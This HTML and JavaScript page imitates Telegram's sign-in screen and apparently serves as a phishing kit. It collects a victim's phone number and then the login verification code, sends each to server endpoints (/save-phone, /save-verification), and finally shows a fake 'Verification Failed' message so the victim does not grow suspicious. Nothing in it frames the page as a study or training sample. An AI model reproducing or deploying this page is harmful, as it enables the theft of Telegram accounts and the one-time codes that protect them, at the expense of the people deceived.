<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <style>
        body {
            font-family: 'Open Sans', Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            background-color: #ffffff;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
        }

        .container img {
            width: 80px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 20px;
            color: #333333;
            margin-bottom: 10px;
        }

        p {
            font-size: 14px;
            color: #777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 5px;
        }

        select, input[type="text"], input[type="number"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        input[type="checkbox"] {
            margin-right: 10px;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .button:hover {
            background-color: #007ab8;
        }

        .dropdown {
            position: relative;
            display: inline-block;
        }

        .dropdown-content {
            display: none;
            position: absolute;
            background-color: #ffffff;
            min-width: 160px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            z-index: 1;
            max-height: 200px;
            overflow-y: auto;
            margin-top: 5px;
        }

        .dropdown-content div {
            padding: 10px;
            cursor: pointer;
        }

        .dropdown-content div:hover {
            background-color: #f1f1f1;
        }

        .dropdown.open .dropdown-content {
            display: block;
        }

        .dropdown.open .dropdown-button {
            transform: rotate(180deg);
            transition: transform 0.2s;
        }

        .dropdown-button {
            font-size: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: transform 0.2s;
        }

        #verificationContainer, #finalMessageContainer {
            display: none;
        }

        @media (max-width: 600px) {
            .container {
                padding: 15px;
                max-width: 100%;
                box-sizing: border-box;
            }

            .button, input[type="text"], input[type="number"] {
                padding: 14px;
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group">
            <label for="countryCode">Country</label>
            <div class="dropdown" id="countryDropdown">
                <div class="dropdown-button">Select Country â–¼</div>
                <div class="dropdown-content" id="dropdownMenu">
                    <!-- Country options will be populated here -->
                </div>
            </div>
            <input type="text" id="phoneNumber" placeholder="Phone Number">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn"> Keep me signed in
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer">
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="number" id="verificationCode" placeholder="Code">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        const countries = [
            { name: 'Australia', code: '+61', flag: 'ðŸ‡¦ðŸ‡º' },
            { name: 'United States', code: '+1', flag: 'ðŸ‡ºðŸ‡¸' },
            { name: 'United Kingdom', code: '+44', flag: 'ðŸ‡¬ðŸ‡§' },
            { name: 'Germany', code: '+49', flag: 'ðŸ‡©ðŸ‡ª' },
            { name: 'France', code: '+33', flag: 'ðŸ‡«ðŸ‡·' },
            { name: 'Japan', code: '+81', flag: 'ðŸ‡¯ðŸ‡µ' },
            { name: 'India', code: '+91', flag: 'ðŸ‡®ðŸ‡³' },
            { name: 'China', code: '+86', flag: 'ðŸ‡¨ðŸ‡³' },
            { name: 'Russia', code: '+7', flag: 'ðŸ‡·ðŸ‡º' },
            { name: 'South Korea', code: '+82', flag: 'ðŸ‡°ðŸ‡·' }
        ];

        function populateCountries() {
            const dropdownMenu = document.getElementById('dropdownMenu');
            countries.forEach(country => {
                const item = document.createElement('div');
                item.innerHTML = `${country.flag} ${country.name} (${country.code})`;
                item.onclick = () => {
                    document.getElementById('phoneNumber').value = country.code;
                    closeDropdown();
                };
                dropdownMenu.appendChild(item);
            });
        }

        function toggleDropdown() {
            const dropdown = document.getElementById('countryDropdown');
            dropdown.classList.toggle('open');
        }

        function closeDropdown() {
            const dropdown = document.getElementById('countryDropdown');
            dropdown.classList.remove('open');
        }

        function updatePhoneNumberPrefix() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumberField = document.getElementById('phoneNumber');
            phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
        }

        function goToVerificationPage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;

            if (phoneNumber === '') {
                alert('Please enter your phone number.');
                return;
            }

            savePhoneNumber(fullPhoneNumber);

            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
            document.getElementById('initialContainer').style.display = 'none';
            document.getElementById('verificationContainer').style.display = 'block';
        }

        async function savePhoneNumber(phoneNumber) {
            try {
                const response = await fetch('/save-phone', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ phoneNumber })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                console.log("Phone number saved successfully");
            } catch (error) {
                console.error("Failed to save phone number:", error);
            }
        }

        function submitVerification() {
            const verificationCode = document.getElementById('verificationCode').value;
            const phoneDisplay = document.getElementById('phoneDisplay').textContent;

            if (verificationCode === '') {
                alert('Please enter the verification code.');
                return;
            }

            saveVerificationCode(phoneDisplay, verificationCode);

            document.getElementById('verificationContainer').style.display = 'none';
            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
            document.getElementById('finalMessageContainer').style.display = 'block';
        }

        async function saveVerificationCode(phoneNumber, verificationCode) {
            try {
                const response = await fetch('/save-verification', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ phoneNumber, verificationCode })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                console.log("Verification code saved successfully");
            } catch (error) {
                console.error("Failed to save verification code:", error);
            }
        }

        function resetForm() {
            document.getElementById('initialContainer').style.display = 'block';
            document.getElementById('verificationContainer').style.display = 'none';
            document.getElementById('finalMessageContainer').style.display = 'none';
            document.getElementById('phoneNumber').value = '';
            document.getElementById('verificationCode').value = '';
        }

        document.addEventListener('DOMContentLoaded', () => {
            populateCountries();
            document.querySelector('.dropdown-button').addEventListener('click', toggleDropdown);
            document.addEventListener('click', event => {
                if (!event.target.closest('.dropdown')) {
                    closeDropdown();
                }
            });
        });
    </script>
</body>
</html>
